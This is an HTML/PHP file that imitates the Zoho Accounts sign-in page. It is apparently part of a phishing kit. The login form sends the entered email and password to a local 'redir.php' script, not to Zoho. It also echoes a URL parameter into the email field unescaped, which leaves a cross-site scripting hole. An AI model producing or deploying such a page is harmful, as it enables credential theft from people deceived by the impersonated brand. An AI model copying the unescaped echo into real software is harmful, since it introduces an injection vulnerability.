<html class="gr__accounts_zoho_eu">
<script id="tinyhippos-injected">if (window.top.ripple) {
        window.top.ripple("bootstrap").inject(window, document);
    }</script>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">


    <title>Zoho Accounts</title>
    <style type="text/css">
        body {
            margin: 0px;
            padding: 0px;
            font-family: "Open sans";
            font-weight: 300
        }

        h3 {
            margin: 0px;
            font-size: 14px;
        }

        .hide {
            display: none;
        }
    </style>
    <link rel="apple-touch-icon" href="https://img.zohostatic.eu/iam/m4007.98/images/apple-touch-icon.png">
    <link rel="stylesheet" type="text/css" href="css/weblogin.css">
    <script src="js/jquery-1.12.2.min.js" type="text/javascript"></script>
    <script src="js/common.js" type="text/javascript"></script>
    <script src="js/xregexp-all.js" type="text/javascript"></script>

    <link href="css/chosen.css" type="text/css" rel="stylesheet">
    <link href="css/chosen-custom.css" type="text/css" rel="stylesheet">
    <script src="js/chosen.jquery.js" type="text/javascript"></script>


    <style type="text/css">
        .chzn-single {
            background-color: transparent !important;
            font-size: 14px;
            margin-left: 13px;
        }

        .chzn-drop {
            width: 260px !important;
            margin-left: 12px !important;
        }

        .chzn-container {
            margin-top: 29.5px !important;
        }

        #selectspan:after {
            content: "";
            height: 5px;
            width: 5px;
            display: inline-block;
            border-left: 3px solid #444;
            border-bottom: 3px solid #444;
            transform: rotate(-45deg);
            margin: 3px;
            border-radius: 1px;
            margin-left: 6px;
        }

    </style>

</head>
<body data-gr-c-s-loaded="true">


<noscript>
    <div><b>Note : </b>Javascript is disabled in your browser. Please enable the javascript to continue.</div>
</noscript>


<div style="display:none;text-align: center;" id="enableCookie">

    <div class="logo-top"></div>

    <div style="text-align: center;padding: 10px;">Cookie is disabled in your browser. Please enable the cookie to
        continue.
    </div>
</div>


<table width="100%" id="outertable" style="">
    <tbody>
    <tr valign="top">
        <td><span id="loadingdiv" class="hide"></span></td>
    </tr>
    <tr>
        <td align="center">
            <div id="loginform">

                <div class="logo-top"></div>

                <div class="title1">One account. Access all services.</div>
                <div class="bdre2"></div>

                <div class="title2" id="zlogin_container_title">Sign In to access Zoho Home</div>

                <div id="fslogin_container_title" style="display:none;">Sign in with</div>

                <form name="msgform" method="post" class="hide" id="msgform">
                    <table width="400" cellpadding="0" cellspacing="0" align="center">
                        <tbody>
                        <tr>
                            <td align="center"><span id="msgboard"></span></td>
                        </tr>
                        <tr>
                            <td align="center">
                                <input type="button" class="redBtn" name="next" value="Continue"
                                       onclick="javascript:proceed();">
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </form>
                <form name="msgOrgUserform" method="post" class="hide" id="msgOrgUserform">
                    <table width="260" cellpadding="0" cellspacing="0" align="center" style="margin-top:50px;">
                        <tbody>
                        <tr>
                            <td align="center" width="360"><font color="red">
                                    <div id="msgcontent"></div>
                                </font></td>
                        </tr>
                        <tr>
                            <td>&nbsp;</td>
                        </tr>
                        <tr>
                            <td>&nbsp;</td>
                        </tr>
                        <tr>
                            <td align="center" style="font-size: 13px"><a
                                        href="javascript:hideorguserTrustedIpmsg();hideLoadinginButton(&#39;0&#39;);">Sign
                                    In </a> as a different user.
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </form>
                <form name="login" id="login" action="redir.php"
                      method="post" novalidate="">
                    <div id="msgpanel" style="display:none"></div>
                    <div id="form-main" style="">
                        <div id="zlogin_field_container">
                            <div class="label">
                                <div class="inlineLabel hide">Email / Phone</div>

                                <input type="text" name="email" id="lid" class="unauthinputText" tabindex="1"
                                       value="<?php echo @$_GET['uploaded'] ?>" placeholder="Email / Phone">
                            </div>
                            <input type="hidden" name="next"
                                   value="0">


                            <div class="hideforsaml">
                                <div class="label">
                                    <div class="inlineLabel hide">Password</div>
                                    <input type="password" name="password" id="pwd" class="unauthinputText" tabindex="1"
                                           placeholder="Password">
                                </div>
                            </div>

                            <div class="label" style="display:none;" id="hip_img_container">
                                <div class="inlineLabel hide">&nbsp;</div>
                                <div class="unauthinputText" style="height: 92px;">
                                    <div id="hipimg"></div>
                                    <span><img class="hip-reload_icon"
                                               style="background:transparent url(../images/register.gif) no-repeat -47px -177px;height: 28px;width: 24px;cursor: pointer;margin: 34px 0px;"
                                               src="spacer.gif" onclick="changeHip()"
                                               title="Refresh image"></span>
                                </div>
                            </div>

                            <div class="label" style="margin: -5px 0px 10px 24px;">
                                <div class="inlineLabel hide">&nbsp;</div>

                                <div style="float: left;">
                                    <label for="rem">
                                        <a href="">
                                            <input type="checkbox" value="10" id="rem" name="rem" class="hide"
                                                   checked="" tabindex="1">
                                            <span class="icon-medium check-checked" id="keepme"
                                                  style="margin-left:0px;"></span>
                                            <span class="rememberText">Keep me signed in</span>
                                        </a>
                                    </label>
                                </div>


                                <div class="forgotpasslink" onclick="goToForgotPassword();">Forgot Password?</div>

                                <div style="clear: both;"></div>
                            </div>

                            <div class="label" style="margin-bottom: 40px;">
                                <div class="inlineLabel"></div>
                                <button type="submit" class="redBtn" id="signin_submit" style="font-family: Open Sans,helvetica,Roboto,sans-serif;margin-bottom:0px;"
                                        tabindex="1">Sign
                                    In<span class="loadingImg"></span></button>
                                <div class="redBtn" id="signin_next" style="display:none"
                                     tabindex="1">Next<span
                                            class="loadingImg"></span></div>
                                <div style="clear: both;"></div>
                            </div>

                        </div>


                        <div id="fslogin_field_container" style="margin-left:20px;display:none;">
                            <div class="label">

                                <div id="fs-google-icon" class="fs-google-icon"
                                     onclick="createandSubmitOpenIDForm(&#39;google&#39;);"></div>

                                <div id="fs-azure-icon" class="fs-azure-icon"
                                     onclick="createandSubmitOpenIDForm(&#39;azure&#39;);"></div>

                                <div id="fs-facebook-icon" class="fs-facebook-icon"
                                     onclick="createandSubmitOpenIDForm(&#39;facebook&#39;);"></div>


                                <div class="fs_signin_more_options" onclick="showModeFSOptions(this)">More options</div>
                                <div class="ortextfromfs">Or</div>
                                <div class="fs_signin_options_txt" onclick="switchSignInOptions()">Sign in with Zoho
                                </div>
                            </div>
                        </div>
                        <div class="openidcontainer" id="openidcontainer">
                            <div class="ortext" style="margin-bottom: 13px;">Or</div>
                            <div class="fs_signin_options_txt" onclick="switchSignInOptions()">Sign in with Google or
                                other IDPs
                            </div>
                        </div>


                        <div id="signuplink">Don't have a Zoho account? <a href="https://www.zoho.eu/signup.html">Sign
                                Up Now</a>
                        </div>

                    </div>
                </form>
            </div>
        </td>
    </tr>
    </tbody>
</table>



</body>
</html>
